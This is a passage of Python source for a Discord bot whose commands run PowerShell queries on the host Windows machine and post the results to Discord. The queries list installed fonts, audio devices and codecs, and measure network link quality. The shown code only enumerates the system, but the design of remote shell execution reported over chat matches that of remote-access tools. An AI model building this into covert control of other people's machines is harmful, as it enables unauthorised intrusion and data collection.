    await ctx.send(embed=create_embed("DPI", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["font-list"])
async def font_list(ctx):
    out, err = await _sh("(New-Object System.Drawing.Text.InstalledFontCollection).Families.Name")
    await ctx.send(embed=create_embed("Fonts", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["audio-devices"])
async def audio_devices(ctx):
    out, err = await _sh("Get-CimInstance Win32_SoundDevice | Select-Object Name,Status,Manufacturer | Format-Table -Auto")
    await ctx.send(embed=create_embed("Audio devices", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["codec-list"])
async def codec_list(ctx):
    out, err = await _sh("Get-CimInstance Win32_CodecFile | Select-Object -First 40 Name | Format-Table -Auto")
    await ctx.send(embed=create_embed("Codecs", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["net-quality"])
async def net_quality(ctx):
    ps = ("$s=Get-NetAdapter | Where-Object Status -eq Up;"
          "$s | Select-Object Name,LinkSpeed,MediaType | Format-Table -Auto;"
          "Test-Connection 1.1.1.1 -Count 6 | Measure-Object ResponseTime -Average -Max | Select-Object Average,Maximum")
    out, err = await _sh(ps, 40)
    await ctx.send(embed=create_embed("Link quality", f"```\n{out[:1700] or err}\n```", 0x2ECC71))

if __name__ == "__main__":
    try:
        bot.run(token)
    except Exception as e:
        _crash("botrun", "fatal {!r}".format(e))
        raise
